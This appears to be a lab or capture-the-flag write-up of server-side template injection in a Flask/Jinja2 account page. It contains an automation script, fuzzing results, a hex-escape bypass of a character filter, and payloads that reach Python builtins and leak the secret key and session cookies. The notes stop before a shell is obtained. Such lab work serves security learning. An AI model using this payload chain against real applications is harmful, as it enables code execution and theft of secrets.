![[Screenshot from 2024-06-30 18-19-28.png]]

## INFORMATION THAT MIGHT BE USEFUL

- webpage registers incoming ip
- support mail: support@templeindustries.local
- hiring mail: hiring@templeindustries.local
- The application might have been made with: PHP, Pascal, javascript, python and perl.

The next step i had to look it up. It seems that there is a specific vuln called template injection which could be used here. Let us try to identify the vuln and the engine that renders the code, for this i will be using the lists seclists/Fuzzing/template-engines-special-vars.txt, and /seclists/Fuzzing/template-engines-expression.txt.

My first guess is that it will be in accounts, since our name is rendered in the html. 

Sure enough after creating the following account

![[Pasted image 20240701111738.png]]

We then get 

![[Pasted image 20240701111716.png]]

Let us make a little code to automate this code execution to the site:

```python
import requests
import io
import random
import re

if __name__ == "__main__":
  signup = "http://10.10.62.78:61337/temporary/dev/newacc"
  login = "http://10.10.62.78:61337/login"
  account = "http://10.10.62.78:61337/account"
  
  line = input("Input code to execute ")
  while line is not None:
    print(f"Attempting with string {line}")

    password = "a" * 10
    email = str(random.randint(1,999999)) + 'noone@gmail.com'
    username = line
  
    session = requests.Session()

    print(f'Parameters were {email}, {password}, {username}')
    response = session.post(signup,data={'email':email,'username':username,'password':password})
    if re.search("Success!",response.text) is not None or re.search('already exists',response.text) is not None:
      print("Account created or already existed")
      response = session.post(login,data={'username':username,'password':password})
      if re.search("Welcome!",response.text) is not None:
        print('Logged into the account')
        response = session.get('http://10.10.62.78:61337/account')
        print(response.text)
      else:
        print("Failed to log into account")
    else:
      print("Failed to create account")
    line = input("Input code to execute ")

```

after going through the wordlists, the following results were extracted, here are the results:

```txt
input -> output
42*42 -> 42*42
{42*42} -> {42*42}
{{42 * 42}} -> 1764                             :)
{{{42*42}}} -> internal server error
#{42*42} -> failed to create account
${42*42} -> ${42*42}
<%=42*42 %> -> <%=42*42 %>
{{=42*42}} -> internal server error
{^xyzm42}1764{/xyzm42} -> {^xyzm42}1764{/xyzm42}
${donotexists|42*42} -> ${donotexists|42*42}
[[${42*42}]] -> [[${42*42}]]

```

```txt
GENERIC 
1/0 -> failed to create account
"{1/0}" -> "{1/0}"
"{{1/0}}" -> internal server error
{{1/0}} -> internal server error

JINJA2 (PYTHON)
self._TemplateReference__context -> failed to create account (filtering is done here as well so any with filtered characters are useless probably)

DJANGO (PYTHON)
settings -> settings
{{settings}} -> #litteraly nothing in the output 
{{settings.DEBUG}} -> internal server error
{{settings.DATABASES}} -> internal server error
{{settings.SECRET_KEY}} -> can't get through the filter

# PUG (NODEJS)
{{self}} -> &lt;TemplateReference None&gt;
{{locals}} -> nothing
{{global}} -> nothing
```

For now let us focus on those 2 -> let us try framework specific, first with things from DJANGO (since i was unable to test for jnija2 i suppose that is still on the table, since some calls for that language seem to work )

```
{{ "hello" | title }} -> Hello
{% if True %} Hello {% endif %} -> Hello
```

## TEMPLATE INJECTION

**checking the capabilites of this** (seems like django so let us continue this way):
- it seems executing arbitrary code is rather not possible in here :(
- might have access to important variables
- tried using {% verbatim %} to get to see the code (server error)
- {{self|debug}} -> error 500
- chatgpt: The phrase `<TemplateReference None>` indicates that the variable `self` is referencing a template reference object.

Actually let us see what objects we are able to get/call

```txt
{% for key, value in config.items() %} {{key}} {{value}} {% endfor %}

ENV production  DEBUG False  TESTING False  PROPAGATE_EXCEPTIONS None  PRESERVE_CONTEXT_ON_EXCEPTION None  SECRET_KEY b&#39;f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&amp;@ry&#39;  PERMANENT_SESSION_LIFETIME 31 days, 0:00:00  USE_X_SENDFILE False  SERVER_NAME None  APPLICATION_ROOT /  SESSION_COOKIE_NAME session  SESSION_COOKIE_DOMAIN False  SESSION_COOKIE_PATH None  SESSION_COOKIE_HTTPONLY True  SESSION_COOKIE_SECURE False  SESSION_COOKIE_SAMESITE None  SESSION_REFRESH_EACH_REQUEST True  MAX_CONTENT_LENGTH None  SEND_FILE_MAX_AGE_DEFAULT None  TRAP_BAD_REQUEST_ERRORS None  TRAP_HTTP_EXCEPTIONS False  EXPLAIN_TEMPLATE_LOADING False  PREFERRED_URL_SCHEME http  JSON_AS_ASCII True  JSON_SORT_KEYS True  JSONIFY_PRETTYPRINT_REGULAR False  JSONIFY_MIMETYPE application/json  TEMPLATES_AUTO_RELOAD None  MAX_COOKIE_SIZE 4093 
```

actually the more tests i do the more it seems like jinja2 for some of the function calls i can do -> after this : {% raw %} \<ul> {% for item in seq %} \<li>{{item}}\</li> {% endfor %} \</ul> {% endraw %} i am convinced this is jninja2 for the syntax

```chatgpt
### Important Considerations

- **Context**: Ensure that the function you are calling is available in the context where Jinja2 renders the template. This usually means passing the function to the template rendering context explicitly if it's not a built-in or part of the template's context.
```

So i am limited to available functions huh

There are currently two problems:

- The filtering eliminates possibilities for exploiting. 
- How to start a shell?
## AVAILABLE OBJECTS 

```bash
{{config}}
{{request}} -> &lt;Request &#39;http://10.10.147.97:61337/account&#39; [GET]&gt;
{{session}} -> &lt;SecureCookieSession {&#39;logged_in&#39;: True, &#39;username&#39;: &#39;{{session}}&#39;}&gt;
{{self}} -> &lt;TemplateReference None&gt;</p>
```

## TRYING TO GET PAST THE FILTERING IN THE LOGIN

if you recall we are limited to not using the following special characters:

```txt
Found match for #
Found match for &
Found match for '
Found match for ;
Found match for _
```

The renderer of jnija2 needs unicode, so let us try to see if we can bypass these restrictions somehow

```txt
\u03B1 -> same
"\u03B1" -> same
\U03B1 -> same
"\U03B1" -> same
0x03B1 -> same
こんにちは -> same
0x10FFFF -> same 
0x265e -> same
{{0x4865727020446572706572}} -> other number
%uff3f%uff3f%uff48%uff45%uff4c%uff4c%uff4f%uff3f%uff3f -> internal error
{{comm\xc3\xa9}} -> internal server error
```

looked up what schema for normalization i should use and turns out that hex works just fine (my option here would have been to make a big fuzzing list for one character and see which one worked for different encodings) -> {{"request.PROPAGATE\x5fEXCEPTIONS"}} -> request.PROPAGATE_EXCEPTIONS

```txt
{{ "\x2D5" | int | abs }} -> 5
```

So this is simply interpreted as any other character. This solves problem 1 (maybie)

## GETTING TO EXECUTE CODE

From what we had gathered before of objects we could access let us try to see what we have 

```txt
{{request["\x5f\x5fdict\x5f\x5f"]}} 

-> 

{&#39;method&#39;: &#39;GET&#39;, &#39;scheme&#39;: &#39;http&#39;, &#39;server&#39;: (&#39;0.0.0.0&#39;, 61337), &#39;root_path&#39;: &#39;&#39;, &#39;path&#39;: &#39;/account&#39;, &#39;query_string&#39;: b&#39;&#39;, &#39;headers&#39;: EnvironHeaders([(&#39;Host&#39;, &#39;10.10.141.223:61337&#39;), (&#39;User-Agent&#39;, &#39;python-requests/2.31.0&#39;), (&#39;Accept-Encoding&#39;, &#39;gzip, deflate, br&#39;), (&#39;Accept&#39;, &#39;*/*&#39;), (&#39;Connection&#39;, &#39;keep-alive&#39;), (&#39;Cookie&#39;, &#39;identifier=d3b356ea0d0e69d7eea088e569528eccf69d2bdf5ec0fa2f43257c30; session=.eJyrVsrJT09PTYnPzFOyKikqTdVRKi1OLcpLzE1VslKqri5KLSxNLS6JjlGKiakwTQMTKZnJJQhejFJsba1SLQDeKRqq.ZoPmGA.LVR9Sgg206Rf82XJqrKoxym2eIM&#39;)]), &#39;remote_addr&#39;: &#39;10.11.73.42&#39;, &#39;environ&#39;: {&#39;wsgi.version&#39;: (1, 0), &#39;wsgi.url_scheme&#39;: &#39;http&#39;, &#39;wsgi.input&#39;: &lt;_io.BufferedReader name=4&gt;, &#39;wsgi.errors&#39;: &lt;_io.TextIOWrapper name=&#39;&lt;stderr&gt;&#39; mode=&#39;w&#39; encoding=&#39;UTF-8&#39;&gt;, &#39;wsgi.multithread&#39;: True, &#39;wsgi.multiprocess&#39;: False, &#39;wsgi.run_once&#39;: False, &#39;werkzeug.server.shutdown&#39;: &lt;function WSGIRequestHandler.make_environ.&lt;locals&gt;.shutdown_server at 0x7f84d168cc80&gt;, &#39;werkzeug.socket&#39;: &lt;socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=(&#39;10.10.141.223&#39;, 61337), raddr=(&#39;10.11.73.42&#39;, 36594)&gt;, &#39;SERVER_SOFTWARE&#39;: &#39;Werkzeug/2.0.1&#39;, &#39;REQUEST_METHOD&#39;: &#39;GET&#39;, &#39;SCRIPT_NAME&#39;: &#39;&#39;, &#39;PATH_INFO&#39;: &#39;/account&#39;, &#39;QUERY_STRING&#39;: &#39;&#39;, &#39;REQUEST_URI&#39;: &#39;/account&#39;, &#39;RAW_URI&#39;: &#39;/account&#39;, &#39;REMOTE_ADDR&#39;: &#39;10.11.73.42&#39;, &#39;REMOTE_PORT&#39;: 36594, &#39;SERVER_NAME&#39;: &#39;0.0.0.0&#39;, &#39;SERVER_PORT&#39;: &#39;61337&#39;, &#39;SERVER_PROTOCOL&#39;: &#39;HTTP/1.1&#39;, &#39;HTTP_HOST&#39;: &#39;10.10.141.223:61337&#39;, &#39;HTTP_USER_AGENT&#39;: &#39;python-requests/2.31.0&#39;, &#39;HTTP_ACCEPT_ENCODING&#39;: &#39;gzip, deflate, br&#39;, &#39;HTTP_ACCEPT&#39;: &#39;*/*&#39;, &#39;HTTP_CONNECTION&#39;: &#39;keep-alive&#39;, &#39;HTTP_COOKIE&#39;: &#39;identifier=d3b356ea0d0e69d7eea088e569528eccf69d2bdf5ec0fa2f43257c30; session=.eJyrVsrJT09PTYnPzFOyKikqTdVRKi1OLcpLzE1VslKqri5KLSxNLS6JjlGKiakwTQMTKZnJJQhejFJsba1SLQDeKRqq.ZoPmGA.LVR9Sgg206Rf82XJqrKoxym2eIM&#39;, &#39;werkzeug.request&#39;: &lt;Request &#39;http://10.10.141.223:61337/account&#39; [GET]&gt;}, &#39;shallow&#39;: False, &#39;cookies&#39;: ImmutableMultiDict([(&#39;identifier&#39;, &#39;d3b356ea0d0e69d7eea088e569528eccf69d2bdf5ec0fa2f43257c30&#39;), (&#39;session&#39;, &#39;.eJyrVsrJT09PTYnPzFOyKikqTdVRKi1OLcpLzE1VslKqri5KLSxNLS6JjlGKiakwTQMTKZnJJQhejFJsba1SLQDeKRqq.ZoPmGA.LVR9Sgg206Rf82XJqrKoxym2eIM&#39;)]), &#39;url_rule&#39;: &lt;Rule &#39;/account&#39; (HEAD, GET, OPTIONS) -&gt; account&gt;, &#39;view_args&#39;: {}, &#39;host&#39;: &#39;10.10.141.223:61337&#39;, &#39;url&#39;: &#39;http://10.10.141.223:61337/account&#39;}

{% for key, item in self["\x5f\x5fdict\x5f\x5f"].items() %} {{key}}, {{item}} <br> {% endfor %}

-> 

_TemplateReference__context, &lt;Context {&#39;url_for&#39;: &lt;function url_for at 0x7f84d2d95a60&gt;, &#39;get_flashed_messages&#39;: &lt;function get_flashed_messages at 0x7f84d2d95c80&gt;, &#39;config&#39;: &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: b&#39;f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&amp;@ry&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;, &#39;namespace&#39;: &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &#39;session&#39;: &lt;SecureCookieSession {&#39;logged_in&#39;: True, &#39;username&#39;: &#39;{% for key, item in self[&#34;\\x5f\\x5fdict\\x5f\\x5f&#34;].items() %} {{key}}, {{item}} &lt;br&gt; {% endfor %}&#39;}&gt;, &#39;request&#39;: &lt;Request &#39;http://10.10.141.223:61337/account&#39; [GET]&gt;, &#39;dict&#39;: &lt;class &#39;dict&#39;&gt;, &#39;range&#39;: &lt;class &#39;range&#39;&gt;, &#39;g&#39;: &lt;flask.g of &#39;webapp&#39;&gt;, &#39;cycler&#39;: &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &#39;joiner&#39;: &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &#39;lipsum&#39;: &lt;function generate_lorem_ipsum at 0x7f84d2fa0d90&gt;} of None&gt; <br>

{{session["\x5f\x5fdict\x5f\x5f"]}}

-> 

{&#39;on_update&#39;: &lt;function SecureCookieSession.__init__.&lt;locals&gt;.on_update at 0x7f84d168c488&gt;, &#39;accessed&#39;: True}
```

Actually had to look up the correct payload. Turns out \_\_dict\_\_ does not return everything you can access. 

Actually i noticed something rather nice, this has the same behaviour as a python variable, so i thought: this probably has all the same special attributes

```
{{request["\x5f\x5fclass\x5f\x5f"]}} 

-> 

&lt;class &#39;flask.wrappers.Request&#39;&gt;

{{request["\x5f\x5fmodule\x5f\x5f"]}}

->

flask.wrappers

{{request["\x5f\x5fdoc\x5f\x5f"]}}

->

The request object used by default in Flask.  Remembers the
    matched endpoint and view arguments.

    It is what ends up as :class:`~flask.request`.  If you want to replace
    the request object used you can subclass this and set
    :attr:`~flask.Flask.request_class` to your subclass.

    The request object is a :class:`~werkzeug.wrappers.Request` subclass and
    provides all of the attributes Werkzeug defines plus a few Flask
    specific ones.

```

identified the object at https://github.com/pallets/flask/blob/main/src/flask/wrappers.py, documentation at https://tedboy.github.io/flask/generated/generated/flask.Request.html

(now that i think about it weird that \_\_dict\_\_ did not return methods )
So this is just a python variable like any other maybie i can just call it like it like that

```txt
 {{request["get\x5fdata"]()}}

->

b&#39;&#39;

{{request|attr("application")|attr("\x5f\x5fcode\x5f\x5f")}}

-> 

&lt;code object application at 0x7f7735c1f390, file &#34;/home/bill/.local/lib/python3.6/site-packages/werkzeug/wrappers/request.py&#34

{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")}}

->

{&#39;__name__&#39;: &#39;werkzeug.wrappers.request&#39;, &#39;__doc__&#39;: None, &#39;__package__&#39;: &#39;werkzeug.wrappers&#39;, &#39;__loader__&#39;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f7735c1e4e0&gt;, &#39;__spec__&#39;: ModuleSpec(name=&#39;werkzeug.wrappers.request&#39;, loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x7f7735c1e4e0&gt;, origin=&#39;/home/bill/.local/lib/python3.6/site-packages/werkzeug/wrappers/request.py&#39;), &#39;__file__&#39;: &#39;/home/bill/.local/lib/python3.6/site-packages/werkzeug/wrappers/request.py&#39;, &#39;__cached__&#39;: &#39;/home/bill/.local/lib/python3.6/site-packages/werkzeug/wrappers/__pycache__/request.cpython-36.pyc&#39;, &#39;__builtins__&#39;: {&#39;__name__&#39;: &#39;builtins&#39;, &#39;__doc__&#39;: &#34;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#39; object; Ellipsis represents `...&#39; in slices.&#34;, &#39;__package__&#39;: &#39;&#39;, &#39;__loader__&#39;: &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &#39;__spec__&#39;: ModuleSpec(name=&#39;builtins&#39;, loader=&lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;), &#39;__build_class__&#39;: &lt;built-in function __build_class__&gt;, &#39;__import__&#39;: &lt;built-in function __import__&gt;, &#39;abs&#39;: &lt;built-in function abs&gt;, &#39;all&#39;: &lt;built-in function all&gt;, &#39;any&#39;: &lt;built-in function any&gt;, &#39;ascii&#39;: &lt;built-in function ascii&gt;, &#39;bin&#39;: &lt;built-in function bin&gt;, &#39;callable&#39;: &lt;built-in function callable&gt;, &#39;chr&#39;: &lt;built-in function chr&gt;, &#39;compile&#39;: &lt;built-in function compile&gt;, &#39;delattr&#39;: &lt;built-in function delattr&gt;, &#39;dir&#39;: &lt;built-in function dir&gt;, &#39;divmod&#39;: &lt;built-in function divmod&gt;, &#39;eval&#39;: &lt;built-in function eval&gt;, &#39;exec&#39;: &lt;built-in function exec&gt;, &#39;format&#39;: &lt;built-in function format&gt;, &#39;getattr&#39;: &lt;built-in function getattr&gt;, &#39;globals&#39;: &lt;built-in function globals&gt;, &#39;hasattr&#39;: &lt;built-in function hasattr&gt;, &#39;hash&#39;: &lt;built-in function hash&gt;, &#39;hex&#39;: &lt;built-in function hex&gt;, &#39;id&#39;: &lt;built-in function id&gt;, &#39;input&#39;: &lt;built-in function input&gt;, &#39;isinstance&#39;: &lt;built-in function isinstance&gt;, &#39;issubclass&#39;: &lt;built-in function issubclass&gt;, &#39;iter&#39;: &lt;built-in function iter&gt;, &#39;len&#39;: &lt;built-in function len&gt;, &#39;locals&#39;: &lt;built-in function locals&gt;, &#39;max&#39;: &lt;built-in function max&gt;, &#39;min&#39;: &lt;built-in function min&gt;, &#39;next&#39;: &lt;built-in function next&gt;, &#39;oct&#39;: &lt;built-in function oct&gt;, &#39;ord&#39;: &lt;built-in function ord&gt;, &#39;pow&#39;: &lt;built-in function pow&gt;, &#39;print&#39;: &lt;built-in function print&gt;, &#39;repr&#39;: &lt;built-in function repr&gt;, &#39;round&#39;: &lt;built-in function round&gt;, &#39;setattr&#39;: &lt;built-in function setattr&gt;, &#39;sorted&#39;: &lt;built-in function sorted&gt;, &#39;sum&#39;: &lt;built-in function sum&gt;, &#39;vars&#39;: &lt;built-in function vars&gt;, &#39;None&#39;: None, &#39;Ellipsis&#39;: Ellipsis, &#39;NotImplemented&#39;: NotImplemented, &#39;False&#39;: False, &#39;True&#39;: True, &#39;bool&#39;: &lt;class &#39;bool&#39;&gt;, &#39;memoryview&#39;: &lt;class &#39;memoryview&#39;&gt;, &#39;bytearray&#39;: &lt;class &#39;bytearray&#39;&gt;, &#39;bytes&#39;: &lt;class &#39;bytes&#39;&gt;, &#39;classmethod&#39;: &lt;class &#39;classmethod&#39;&gt;, &#39;complex&#39;: &lt;class &#39;complex&#39;&gt;, &#39;dict&#39;: &lt;class &#39;dict&#39;&gt;, &#39;enumerate&#39;: &lt;class &#39;enumerate&#39;&gt;, &#39;filter&#39;: &lt;class &#39;filter&#39;&gt;, &#39;float&#39;: &lt;class &#39;float&#39;&gt;, &#39;frozenset&#39;: &lt;class &#39;frozenset&#39;&gt;, &#39;property&#39;: &lt;class &#39;property&#39;&gt;, &#39;int&#39;: &lt;class &#39;int&#39;&gt;, &#39;list&#39;: &lt;class &#39;list&#39;&gt;, &#39;map&#39;: &lt;class &#39;map&#39;&gt;, &#39;object&#39;: &lt;class &#39;object&#39;&gt;, &#39;range&#39;: &lt;class &#39;range&#39;&gt;, &#39;reversed&#39;: &lt;class &#39;reversed&#39;&gt;, &#39;set&#39;: &lt;class &#39;set&#39;&gt;, &#39;slice&#39;: &lt;class &#39;slice&#39;&gt;, &#39;staticmethod&#39;: &lt;class &#39;staticmethod&#39;&gt;, &#39;str&#39;: &lt;class &#39;str&#39;&gt;, &#39;super&#39;: &lt;class &#39;super&#39;&gt;, &#39;tuple&#39;: &lt;class &#39;tuple&#39;&gt;, &#39;type&#39;: &lt;class &#39;type&#39;&gt;, &#39;zip&#39;: &lt;class &#39;zip&#39;&gt;, &#39;__debug__&#39;: True, &#39;BaseException&#39;: &lt;class &#39;BaseException&#39;&gt;, &#39;Exception&#39;: &lt;class &#39;Exception&#39;&gt;, &#39;TypeError&#39;: &lt;class &#39;TypeError&#39;&gt;, &#39;StopAsyncIteration&#39;: &lt;class &#39;StopAsyncIteration&#39;&gt;, &#39;StopIteration&#39;: &lt;class &#39;StopIteration&#39;&gt;, &#39;GeneratorExit&#39;: &lt;class &#39;GeneratorExit&#39;&gt;, &#39;SystemExit&#39;: &lt;class &#39;SystemExit&#39;&gt;, &#39;KeyboardInterrupt&#39;: &lt;class &#39;KeyboardInterrupt&#39;&gt;, &#39;ImportError&#39;: &lt;class &#39;ImportError&#39;&gt;, &#39;ModuleNotFoundError&#39;: &lt;class &#39;ModuleNotFoundError&#39;&gt;, &#39;OSError&#39;: &lt;class &#39;OSError&#39;&gt;, &#39;EnvironmentError&#39;: &lt;class &#39;OSError&#39;&gt;, &#39;IOError&#39;: &lt;class &#39;OSError&#39;&gt;, &#39;EOFError&#39;: &lt;class &#39;EOFError&#39;&gt;, &#39;RuntimeError&#39;: &lt;class &#39;RuntimeError&#39;&gt;, &#39;RecursionError&#39;: &lt;class &#39;RecursionError&#39;&gt;, &#39;NotImplementedError&#39;: &lt;class &#39;NotImplementedError&#39;&gt;, &#39;NameError&#39;: &lt;class &#39;NameError&#39;&gt;, &#39;UnboundLocalError&#39;: &lt;class &#39;UnboundLocalError&#39;&gt;, &#39;AttributeError&#39;: &lt;class &#39;AttributeError&#39;&gt;, &#39;SyntaxError&#39;: &lt;class &#39;SyntaxError&#39;&gt;, &#39;IndentationError&#39;: &lt;class &#39;IndentationError&#39;&gt;, &#39;TabError&#39;: &lt;class &#39;TabError&#39;&gt;, &#39;LookupError&#39;: &lt;class &#39;LookupError&#39;&gt;, &#39;IndexError&#39;: &lt;class &#39;IndexError&#39;&gt;, &#39;KeyError&#39;: &lt;class &#39;KeyError&#39;&gt;, &#39;ValueError&#39;: &lt;class &#39;ValueError&#39;&gt;, &#39;UnicodeError&#39;: &lt;class &#39;UnicodeError&#39;&gt;, &#39;UnicodeEncodeError&#39;: &lt;class &#39;UnicodeEncodeError&#39;&gt;, &#39;UnicodeDecodeError&#39;: &lt;class &#39;UnicodeDecodeError&#39;&gt;, &#39;UnicodeTranslateError&#39;: &lt;class &#39;UnicodeTranslateError&#39;&gt;, &#39;AssertionError&#39;: &lt;class &#39;AssertionError&#39;&gt;, &#39;ArithmeticError&#39;: &lt;class &#39;ArithmeticError&#39;&gt;, &#39;FloatingPointError&#39;: &lt;class &#39;FloatingPointError&#39;&gt;, &#39;OverflowError&#39;: &lt;class &#39;OverflowError&#39;&gt;, &#39;ZeroDivisionError&#39;: &lt;class &#39;ZeroDivisionError&#39;&gt;, &#39;SystemError&#39;: &lt;class &#39;SystemError&#39;&gt;, &#39;ReferenceError&#39;: &lt;class &#39;ReferenceError&#39;&gt;, &#39;BufferError&#39;: &lt;class &#39;BufferError&#39;&gt;, &#39;MemoryError&#39;: &lt;class &#39;MemoryError&#39;&gt;, &#39;Warning&#39;: &lt;class &#39;Warning&#39;&gt;, &#39;UserWarning&#39;: &lt;class &#39;UserWarning&#39;&gt;, &#39;DeprecationWarning&#39;: &lt;class &#39;DeprecationWarning&#39;&gt;, &#39;PendingDeprecationWarning&#39;: &lt;class &#39;PendingDeprecationWarning&#39;&gt;, &#39;SyntaxWarning&#39;: &lt;class &#39;SyntaxWarning&#39;&gt;, &#39;RuntimeWarning&#39;: &lt;class &#39;RuntimeWarning&#39;&gt;, &#39;FutureWarning&#39;: &lt;class &#39;FutureWarning&#39;&gt;, &#39;ImportWarning&#39;: &lt;class &#39;ImportWarning&#39;&gt;, &#39;UnicodeWarning&#39;: &lt;class &#39;UnicodeWarning&#39;&gt;, &#39;BytesWarning&#39;: &lt;class &#39;BytesWarning&#39;&gt;, &#39;ResourceWarning&#39;: &lt;class &#39;ResourceWarning&#39;&gt;, &#39;ConnectionError&#39;: &lt;class &#39;ConnectionError&#39;&gt;, &#39;BlockingIOError&#39;: &lt;class &#39;BlockingIOError&#39;&gt;, &#39;BrokenPipeError&#39;: &lt;class &#39;BrokenPipeError&#39;&gt;, &#39;ChildProcessError&#39;: &lt;class &#39;ChildProcessError&#39;&gt;, &#39;ConnectionAbortedError&#39;: &lt;class &#39;ConnectionAbortedError&#39;&gt;, &#39;ConnectionRefusedError&#39;: &lt;class &#39;ConnectionRefusedError&#39;&gt;, &#39;ConnectionResetError&#39;: &lt;class &#39;ConnectionResetError&#39;&gt;, &#39;FileExistsError&#39;: &lt;class &#39;FileExistsError&#39;&gt;, &#39;FileNotFoundError&#39;: &lt;class &#39;FileNotFoundError&#39;&gt;, &#39;IsADirectoryError&#39;: &lt;class &#39;IsADirectoryError&#39;&gt;, &#39;NotADirectoryError&#39;: &lt;class &#39;NotADirectoryError&#39;&gt;, &#39;InterruptedError&#39;: &lt;class &#39;InterruptedError&#39;&gt;, &#39;PermissionError&#39;: &lt;class &#39;PermissionError&#39;&gt;, &#39;ProcessLookupError&#39;: &lt;class &#39;ProcessLookupError&#39;&gt;, &#39;TimeoutError&#39;: &lt;class &#39;TimeoutError&#39;&gt;, &#39;open&#39;: &lt;built-in function open&gt;, &#39;quit&#39;: Use quit() or Ctrl-D (i.e. EOF) to exit, &#39;exit&#39;: Use exit() or Ctrl-D (i.e. EOF) to exit, &#39;copyright&#39;: Copyright (c) 2001-2019 Python Software Foundation.
All Rights Reserved.

Copyright (c) 2000 BeOpen.com.
All Rights Reserved.

Copyright (c) 1995-2001 Corporation for National Research Initiatives.
All Rights Reserved.

Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
All Rights Reserved., &#39;credits&#39;:     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., &#39;license&#39;: Type license() to see the full license text, &#39;help&#39;: Type help() for interactive help, or help(object) for help about object.}, &#39;functools&#39;: &lt;module &#39;functools&#39; from &#39;/usr/lib/python3.6/functools.py&#39;&gt;, &#39;json&#39;: &lt;module &#39;json&#39; from &#39;/usr/lib/python3.6/json/__init__.py&#39;&gt;, &#39;typing&#39;: &lt;module &#39;typing&#39; from &#39;/usr/lib/python3.6/typing.py&#39;&gt;, &#39;t&#39;: &lt;module &#39;typing&#39; from &#39;/usr/lib/python3.6/typing.py&#39;&gt;, &#39;warnings&#39;: &lt;module &#39;warnings&#39; from &#39;/usr/lib/python3.6/warnings.py&#39;&gt;, &#39;BytesIO&#39;: &lt;class &#39;_io.BytesIO&#39;&gt;, &#39;_wsgi_decoding_dance&#39;: &lt;function _wsgi_decoding_dance at 0x7f7737754e18&gt;, &#39;CombinedMultiDict&#39;: &lt;class &#39;werkzeug.datastructures.CombinedMultiDict&#39;&gt;, &#39;EnvironHeaders&#39;: &lt;class &#39;werkzeug.datastructures.EnvironHeaders&#39;&gt;, &#39;FileStorage&#39;: &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &#39;ImmutableMultiDict&#39;: &lt;class &#39;werkzeug.datastructures.ImmutableMultiDict&#39;&gt;, &#39;iter_multi_items&#39;: &lt;function iter_multi_items at 0x7f7735ce6488&gt;, &#39;MultiDict&#39;: &lt;class &#39;werkzeug.datastructures.MultiDict&#39;&gt;, &#39;default_stream_factory&#39;: &lt;function default_stream_factory at 0x7f7735c2cc80&gt;, &#39;FormDataParser&#39;: &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &#39;_SansIORequest&#39;: &lt;class &#39;werkzeug.sansio.request.Request&#39;&gt;, &#39;cached_property&#39;: werkzeug.utils.cached_property, &#39;environ_property&#39;: werkzeug.utils.environ_property, &#39;_get_server&#39;: &lt;function _get_server at 0x7f7735c7b730&gt;, &#39;get_input_stream&#39;: &lt;function get_input_stream at 0x7f7735c7b8c8&gt;, &#39;BadRequest&#39;: &lt;class &#39;werkzeug.exceptions.BadRequest&#39;&gt;, &#39;Request&#39;: &lt;class &#39;werkzeug.wrappers.request.Request&#39;&gt;, &#39;StreamOnlyMixin&#39;: &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &#39;PlainRequest&#39;: &lt;class &#39;werkzeug.wrappers.request.PlainRequest&#39;&gt;}</p>


{% for item in request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f") %} {{item}} <br> {% endfor %}

-> 

__name__ <br>  __doc__ <br>  __package__ <br>  __loader__ <br>  __spec__ <br>  __file__ <br>  __cached__ <br>  __builtins__ <br>  functools <br>  json <br>  typing <br>  t <br>  warnings <br>  BytesIO <br>  _wsgi_decoding_dance <br>  CombinedMultiDict <br>  EnvironHeaders <br>  FileStorage <br>  ImmutableMultiDict <br>  iter_multi_items <br>  MultiDict <br>  default_stream_factory <br>  FormDataParser <br>  _SansIORequest <br>  cached_property <br>  environ_property <br>  _get_server <br>  get_input_stream <br>  BadRequest <br>  Request <br>  StreamOnlyMixin <br>  PlainRequest <br> 


{% set var1 = request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f") %} {{var1}} 

-> 

works to access other 

the bytesio object

